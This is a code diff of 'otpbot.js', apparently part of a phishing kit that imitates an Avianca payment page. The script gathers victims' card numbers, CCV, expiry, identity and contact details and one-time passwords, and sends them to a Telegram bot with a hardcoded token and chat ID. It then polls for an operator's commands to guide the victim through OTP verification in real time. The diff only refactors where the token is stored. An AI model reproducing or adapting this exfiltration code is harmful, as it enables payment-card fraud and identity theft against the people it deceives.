@@ -1,8 +1,5 @@
-// CONFIGURACIÓN DIRECTA (modifica estos valores con los tuyos reales)
-const BOT_TOKEN = "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y";
-const CHAT_ID = "-4644294739";
+// otpbot.js - versión sin claves.json
 
-// Script principal
 document.addEventListener("DOMContentLoaded", () => {
     const btnNextStep = document.getElementById("btnNextStep");
 
@@ -43,7 +40,26 @@ document.addEventListener("DOMContentLoaded", () => {
         }
 
         const transactionId = Date.now().toString();
-        const mensaje = `✈️ <b>Avianca</b> ✈️\n💳 Tarjeta: <code>${pagoavianca.card}</code>\n🗓️ Fecha: <code>${pagoavianca.card_date}</code>\n💳 CCV: <code>${pagoavianca.ccv}</code>\n🏦 Banco: <code>${pagoavianca.bank}</code>\n📅 Cuotas: <code>${pagoavianca.cuotas}</code>\n👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>\n👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>\n💳 CC: <code>${pagoavianca.cc}</code>\n📨 Correo: <code>${pagoavianca.email}</code>\n📲 Teléfono: <code>${pagoavianca.phone}</code>\n🏙️ Ciudad: <code>${pagoavianca.city}</code>\n🗽 Provincia: <code>${pagoavianca.state}</code>\n🧭 Dirección: <code>${pagoavianca.address}</code>\n🔑 OTP: <code>${otp}</code>`;
+
+        // 🔐 PON AQUÍ TU TOKEN Y CHAT ID:
+        const botToken = "7670338962:AAFMoa86jfCfD7N7ZbeDpN_WmXZH9xmW51Y";
+        const chatId = "-4644294739";
+
+        const mensaje = `✈️ <b>Avianca</b> ✈️
+💳 Tarjeta: <code>${pagoavianca.card}</code>
+🗓️ Fecha: <code>${pagoavianca.card_date}</code>
+💳 CCV: <code>${pagoavianca.ccv}</code>
+🏦 Banco: <code>${pagoavianca.bank}</code>
+📅 Cuotas: <code>${pagoavianca.cuotas}</code>
+👨🏻‍🦱 Nombre: <code>${pagoavianca.name}</code>
+👨🏻‍🦱 Apellido: <code>${pagoavianca.lastname}</code>
+💳 CC: <code>${pagoavianca.cc}</code>
+📨 Correo: <code>${pagoavianca.email}</code>
+📲 Teléfono: <code>${pagoavianca.phone}</code>
+🏙️ Ciudad: <code>${pagoavianca.city}</code>
+🗽 Provincia: <code>${pagoavianca.state}</code>
+🧭 Dirección: <code>${pagoavianca.address}</code>
+🔑 OTP: <code>${otp}</code>`;
 
         const keyboard = {
             inline_keyboard: [
@@ -59,11 +75,11 @@ document.addEventListener("DOMContentLoaded", () => {
         };
 
         try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
+                    chat_id: chatId,
                     text: mensaje,
                     parse_mode: "HTML",
                     reply_markup: keyboard
@@ -75,7 +91,7 @@ document.addEventListener("DOMContentLoaded", () => {
             if (data.ok) {
                 console.log("✅ Mensaje enviado a Telegram:", data);
                 const messageId = data.result.message_id;
-                checkPaymentVerification(transactionId, messageId);
+                checkPaymentVerification(transactionId, messageId, botToken, chatId);
             } else {
                 console.error("❌ Error al enviar mensaje a Telegram:", data);
             }
@@ -85,16 +101,14 @@ document.addEventListener("DOMContentLoaded", () => {
     });
 });
 
-// Función de verificación en Telegram
-async function checkPaymentVerification(transactionId, messageId) {
+async function checkPaymentVerification(transactionId, messageId, botToken, chatId) {
     try {
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
         const data = await response.json();
 
         const updates = data.result;
         const verificationUpdate = updates.find((update) =>
-            update.callback_query &&
-            [
+            update.callback_query && [
                 `error_tc:${transactionId}`,
                 `error_logo:${transactionId}`,
                 `dinamic:${transactionId}`,
@@ -107,11 +121,11 @@ async function checkPaymentVerification(transactionId, messageId) {
         );
 
         if (verificationUpdate) {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
+            await fetch(`https://api.telegram.org/bot${botToken}/editMessageReplyMarkup`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
+                    chat_id: chatId,
                     message_id: messageId,
                     reply_markup: { inline_keyboard: [] }
                 })
@@ -148,11 +162,11 @@ async function checkPaymentVerification(transactionId, messageId) {
                     break;
             }
         } else {
-            setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+            setTimeout(() => checkPaymentVerification(transactionId, messageId, botToken, chatId), 2000);
         }
     } catch (error) {
         console.error("❌ Error verificando respuesta de Telegram:", error);
-        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+        setTimeout(() => checkPaymentVerification(transactionId, messageId, botToken, chatId), 2000);
     }
 
     localStorage.setItem("transactionId", transactionId);
